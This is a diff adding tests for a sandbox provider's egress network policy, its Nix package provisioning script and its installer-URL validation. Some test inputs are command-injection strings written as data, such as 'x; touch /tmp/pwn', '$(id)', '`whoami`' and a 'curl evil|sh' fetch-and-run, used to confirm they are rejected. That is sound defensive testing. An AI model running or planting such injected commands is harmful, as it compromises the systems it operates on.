@@ -1,7 +1,9 @@
-import { describe, expect, test } from "bun:test";
-import { __testOnly } from "../runtime/providers/vercel.js";
+import { afterEach, describe, expect, test } from "bun:test";
+import { __testOnly, nixInstallerUrl } from "../runtime/providers/vercel.js";
+import { NIX_SUBSTITUTER_DOMAINS } from "../runtime/packages.js";
 
-const { networkPolicyFromDomains } = __testOnly;
+const { networkPolicyFromDomains, provisionScript, withProvisionedPath } =
+  __testOnly;
 
 describe("vercel networkPolicyFromDomains — deny subtraction", () => {
   test("no denies: wildcard stays allow-all, lists pass through", () => {
@@ -63,5 +65,254 @@ describe("vercel networkPolicyFromDomains — deny subtraction", () => {
     expect(
       networkPolicyFromDomains(["API.Example.com", "ok.com"], ["api.example.com"])
     ).toEqual({ allow: ["ok.com"] });
+  });
+});
+
+describe("vercel networkPolicyFromDomains — gateway-derived extra hosts", () => {
+  test("adds the substituters to a configured allowlist", () => {
+    expect(
+      networkPolicyFromDomains(["github.com"], undefined, ["cache.nixos.org"])
+    ).toEqual({ allow: ["github.com", "cache.nixos.org"] });
+  });
+
+  test("grants the substituters even when the agent has no allowlist of its own", () => {
+    // Otherwise an agent whose only tooling is a contributed CLI would get a
+    // deny-all sandbox and the install would hang.
+    expect(
+      networkPolicyFromDomains(undefined, undefined, ["cache.nixos.org"])
+    ).toEqual({ allow: ["cache.nixos.org"] });
+  });
+
+  test("an explicit deny still subtracts a substituter", () => {
+    // No silent exemption: an operator who denies the cache gets no package
+    // install rather than an egress hole they did not approve.
+    expect(
+      networkPolicyFromDomains(["github.com"], ["cache.nixos.org"], [
+        "cache.nixos.org",
+      ])
+    ).toEqual({ allow: ["github.com"] });
+  });
+});
+
+describe("vercel provisionScript", () => {
+  test("installs each package from nixpkgs into the sandbox-local profile", () => {
+    const script = provisionScript(["gh", "ripgrep"], "marker123");
+    expect(script).toContain(`tarball+https://channels.nixos.org/nixpkgs-unstable/nixexprs.tar.xz#gh`);
+    expect(script).toContain(`tarball+https://channels.nixos.org/nixpkgs-unstable/nixexprs.tar.xz#ripgrep`);
+    expect(script).toContain(
+      `nix profile install --profile "$PROFILE" "tarball+https://channels.nixos.org/nixpkgs-unstable/nixexprs.tar.xz#gh" "tarball+https://channels.nixos.org/nixpkgs-unstable/nixexprs.tar.xz#ripgrep"`
+    );
+    expect(script).toContain('PROFILE="$NIX_HOME/profiles/marker123"');
+    expect(script).toContain('ln -sfn "$PROFILE" "$NIX_HOME/profile"');
+  });
+
+  test("resolves packages only through hosts the egress policy grants", () => {
+    // A bare `nixpkgs#gh` is an INDIRECT flake ref: the registry resolves it
+    // via github.com, which is NOT in NIX_SUBSTITUTER_DOMAINS. A cold install
+    // then failed unless the agent happened to allow GitHub for its own
+    // reasons. Every host the script names must be one this module grants.
+    const script = provisionScript(["gh"], "marker123");
+    expect(script).not.toMatch(/["\s]nixpkgs#/);
+    for (const ref of script.matchAll(/https:\/\/([A-Za-z0-9.-]+)/g)) {
+      const host = ref[1];
+      const granted =
+        NIX_SUBSTITUTER_DOMAINS.includes(host) ||
+        // The pinned installer artifact is served from a substituter host too.
+        NIX_SUBSTITUTER_DOMAINS.some((d) => host.endsWith(d));
+      expect(granted, `ungranted host in provision script: ${host}`).toBe(true);
+    }
+  });
+
+  test("PATH names the exact package set, not the shared profile symlink", () => {
+    // One persistent conversation sandbox can see different tooling settings
+    // across concurrent turns. Pointing PATH at the mutable `profile` symlink
+    // would let those execs resolve the same link, breaking per-token package
+    // isolation.
+    const ghCtx = {
+      command: "gh --version",
+      nixPackages: ["gh"],
+      provisioned: { installed: ["gh"], failed: [], cached: true },
+    } as never;
+    const jqCtx = {
+      command: "jq --version",
+      nixPackages: ["jq"],
+      provisioned: { installed: ["jq"], failed: [], cached: true },
+    } as never;
+
+    const gh = withProvisionedPath(ghCtx);
+    const jq = withProvisionedPath(jqCtx);
+
+    expect(gh).not.toContain("/profile/bin");
+    expect(jq).not.toContain("/profile/bin");
+    // Different package sets must resolve to different profile paths.
+    const pathOf = (s: string) => s.match(/export PATH="([^:]+)/)?.[1];
+    expect(pathOf(gh)).not.toBe(pathOf(jq));
+    expect(pathOf(gh)).toContain("/profiles/");
+  });
+
+  test("serializes the mutating section behind a sandbox-side lock", () => {
+    // Several execs can land on ONE sandbox concurrently. Without a lock, two
+    // cold paths bootstrap Nix twice, or one `rm -f "$PROFILE"` runs while the
+    // other is installing into it. The re-check after acquiring is what makes
+    // the loser take the cache-hit path instead of rebuilding.
+    const script = provisionScript(["gh"], "marker123");
+    const lockAt = script.indexOf("flock 9");
+    expect(lockAt).toBeGreaterThan(-1);
+
+    // Everything that mutates the shared profile selector or package state must
+    // sit after the lock.
+    for (const mutation of [
+      'ln -sfn "$PROFILE"',
+      `printf '%s' "marker123" > /opt/lobu-nix/.lobu-packages`,
+      `printf 'experimental-features = nix-command flakes\\n'`,
+      "curl -fsSL",
+      'rm -f "$PROFILE"',
+      "nix profile install",
+    ]) {
+      expect(
+        script.indexOf(mutation),
+        `${mutation} must run under the lock`
+      ).toBeGreaterThan(lockAt);
+    }
+
+    // Cache checks also run only after acquiring.
+    const cacheChecks = script
+      .split("\n")
+      .filter((l) => l.includes('[ -d "$PROFILE/bin" ]'));
+    expect(cacheChecks.length).toBeGreaterThanOrEqual(2);
+    for (const check of cacheChecks) {
+      expect(script.indexOf(check)).toBeGreaterThan(lockAt);
+    }
+  });
+
+  test("checks the actual single-user nix binary before bootstrapping", () => {
+    const script = provisionScript(["gh"], "marker123");
+    expect(script).toContain('[ ! -x "$NIX_HOME/.nix-profile/bin/nix" ]');
+    expect(script).not.toContain("$NIX_HOME/nix/var/nix/profiles/default/bin/nix");
+  });
+
+  test("uses an exact hash-addressed profile so removed packages leave PATH", () => {
+    const first = provisionScript(["gh"], "set-a");
+    const second = provisionScript(["jq"], "set-b");
+    expect(first).toContain('PROFILE="$NIX_HOME/profiles/set-a"');
+    expect(first).toContain(`tarball+https://channels.nixos.org/nixpkgs-unstable/nixexprs.tar.xz#gh`);
+    expect(second).toContain('PROFILE="$NIX_HOME/profiles/set-b"');
+    expect(second).toContain(`tarball+https://channels.nixos.org/nixpkgs-unstable/nixexprs.tar.xz#jq`);
+    expect(second).not.toContain(`tarball+https://channels.nixos.org/nixpkgs-unstable/nixexprs.tar.xz#gh`);
+    expect(second).toContain('ln -sfn "$PROFILE" "$NIX_HOME/profile"');
+  });
+
+  test("re-selects an already-built set without touching the network", () => {
+    // The profile dir survives in the persistent sandbox even if the marker
+    // was clobbered, so PATH can be pointed at it with no substituter access.
+    const script = provisionScript(["gh"], "marker123");
+    const offline = script
+      .split("\n")
+      .find(
+        (line) =>
+          line.startsWith('if [ -d "$PROFILE/bin" ]') &&
+          line.includes("lobu-packages: cached")
+      );
+    expect(offline).toBeDefined();
+    expect(script.indexOf('if [ -d "$PROFILE/bin" ]')).toBeLessThan(
+      script.indexOf("curl")
+    );
+  });
+
+  test("deletes a partial profile so a failed attempt cannot poison the retry", () => {
+    const script = provisionScript(["gh"], "marker123");
+    expect(script).toContain(
+      'rm -f "$PROFILE" "$PROFILE"-*-link'
+    );
+    expect(script).toContain(
+      `if ! nix profile install --profile "$PROFILE" "tarball+https://channels.nixos.org/nixpkgs-unstable/nixexprs.tar.xz#gh"; then rm -f "$PROFILE" "$PROFILE"-*-link; exit 1; fi`
+    );
+  });
+
+  test("short-circuits on a marker match before touching the network", () => {
+    // Idempotence lives in the SANDBOX filesystem, not a gateway Map: the pod
+    // that provisioned is not the pod that handles the next message.
+    const script = provisionScript(["gh"], "marker123");
+    const guard = script
+      .split("\n")
+      .find((line) => line.includes("lobu-packages: cached"));
+    expect(guard).toContain("/opt/lobu-nix/.lobu-packages");
+    expect(guard).toContain("lobu-packages: cached");
+    // The guard must precede the installer download, or the "cached" path still
+    // pays the bootstrap.
+    expect(script.indexOf("marker123")).toBeLessThan(script.indexOf("curl"));
+  });
+
+  test("fails the pipeline instead of trusting the installer's exit code", () => {
+    // `curl … | sh` exits 0 on a dead download (sh reads empty stdin), so a
+    // failed bootstrap would only surface as a confusing missing-nix.sh error.
+    const script = provisionScript(["gh"], "marker123");
+    expect(script).toContain("set -o pipefail");
+    expect(script.indexOf("set -o pipefail")).toBeLessThan(
+      script.indexOf("curl")
+    );
+  });
+
+  test("sources the third-party profile script without nounset", () => {
+    const script = provisionScript(["gh"], "marker123");
+    expect(script).toContain(
+      'set +u; . "$NIX_HOME/.nix-profile/etc/profile.d/nix.sh"; set -u'
+    );
+  });
+
+  test("keeps root-written provisioning state out of the agent workspace", () => {
+    // Provisioning runs as root while the worker writes /vercel/sandbox
+    // unprivileged: a marker or HOME path the worker can swap for a symlink
+    // would be followed by root's writes.
+    const script = provisionScript(["gh"], "marker123");
+    expect(script).toContain("export NIX_HOME=/opt/lobu-nix");
+    expect(script).not.toContain("/vercel/sandbox");
+  });
+
+  test("refuses to build a command line for an unvalidated package name", () => {
+    // Defence in depth: the route already sanitizes, but this string BECOMES a
+    // command line, so a caller that forgets must fail loudly, not inject.
+    expect(() => provisionScript(["gh", "x; touch /tmp/pwn"], "m")).toThrow();
+    expect(() => provisionScript(["$(id)"], "m")).toThrow();
+  });
+});
+
+describe("nixInstallerUrl", () => {
+  const original = process.env.LOBU_NIX_INSTALLER_URL;
+  afterEach(() => {
+    if (original === undefined) delete process.env.LOBU_NIX_INSTALLER_URL;
+    else process.env.LOBU_NIX_INSTALLER_URL = original;
+  });
+
+  test("defaults to a version-pinned installer on a substituter host", () => {
+    delete process.env.LOBU_NIX_INSTALLER_URL;
+    // Pinned (not `nixos.org/nix/install`) so the bootstrap needs no egress
+    // grant beyond the substituters the policy already carries.
+    expect(nixInstallerUrl()).toBe(
+      "https://releases.nixos.org/nix/nix-2.28.4/install"
+    );
+    expect(nixInstallerUrl()).toStartWith("https://releases.nixos.org/");
+  });
+
+  test("accepts a plain https mirror override", () => {
+    process.env.LOBU_NIX_INSTALLER_URL = "https://mirror.internal/nix/install";
+    expect(nixInstallerUrl()).toBe("https://mirror.internal/nix/install");
+  });
+
+  test("falls back to the pinned default for anything shell-significant", () => {
+    // The value is interpolated into a shell command.
+    for (const bad of [
+      "https://x/install; curl evil|sh",
+      "https://x/$(id)",
+      "https://x/`whoami`",
+      "http://x/install",
+      "file:///etc/passwd",
+      "https://x/install&&id",
+    ]) {
+      process.env.LOBU_NIX_INSTALLER_URL = bad;
+      expect(nixInstallerUrl()).toBe(
+        "https://releases.nixos.org/nix/nix-2.28.4/install"
+      );
+    }
   });
 });
